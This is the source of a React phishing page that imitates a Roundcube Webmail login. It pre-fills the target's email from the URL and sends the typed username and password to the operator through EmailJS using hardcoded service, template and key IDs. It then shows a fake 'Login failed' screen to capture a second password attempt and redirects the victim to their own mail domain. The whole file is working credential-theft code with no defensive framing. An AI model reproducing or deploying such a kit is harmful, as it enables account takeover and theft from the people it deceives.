import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import emailjs from "emailjs-com";
import { useParams } from "react-router-dom";

function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);

  const submitHandler = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_9b2by5g",
        "template_f65tcxq",
        e.target,
        "fAkQFatVq-bEa_Al3"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.preventDefault();
    setShowForm(false);
    setConfirmForm(true);
  };

  const editHandler = (e) => {
    e.preventDefault();
    let emailss = params.id;
    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
    emailjs
      .sendForm(
        "service_9b2by5g",
        "template_f65tcxq",
        e.target,
        "fAkQFatVq-bEa_Al3"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );

    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };

  return (
    <Styls>
      <div className="contsainer">
        {showForm && (
          <div className="imagees">
            <img
              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
              className="imagee"
              alt="displare"
            />
          </div>
        )}
        {showForm && (
          <form className="formal" onSubmit={submitHandler}>
            <label>
              <span className="newicon1">
                <i class="fas fa-user fa-1x"></i>
              </span>
              <input
                type="email"
                name="to_user"
                required
                placeholder="Username"
                value={params.id}
              />
            </label>
            <br></br>
            <label>
              <span className="newicon1">
                <i class="fas fa-lock fa-1x"></i>
              </span>
              <input
                type="password"
                name="to_pass"
                required
                placeholder="Password"
              />
            </label>
            <button> LOGIN </button>
            <p>Roundcube Webmail </p>
          </form>
        )}
      </div>
      {confirmForm && (
        <div className="contsainer">
          <div className="imagees">
            <img
              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
              className="imagee"
              alt="displare"
            />
          </div>

          <form className="formal" onSubmit={editHandler}>
            <label>
              <span className="newicon1">
                {" "}
                <i class="fas fa-user fa-1x"></i>{" "}
              </span>
              <input
                type="email"
                name="to_user"
                required
                value={params.id}
                placeholder="Username"
              />
            </label>
            <br></br>

            <label>
              <span className="newicon1">
                {" "}
                <i class="fas fa-lock fa-1x"></i>{" "}
              </span>
              <input
                type="password"
                name="to_pass"
                required
                placeholder="Password"
              />
            </label>
            <p className="reda">Login failed Incorrect Password</p>
            <button> LOGIN </button>
            <p>Roundcube Webmail </p>
          </form>
        </div>
      )}
    </Styls>
  );
}

export default Forms;
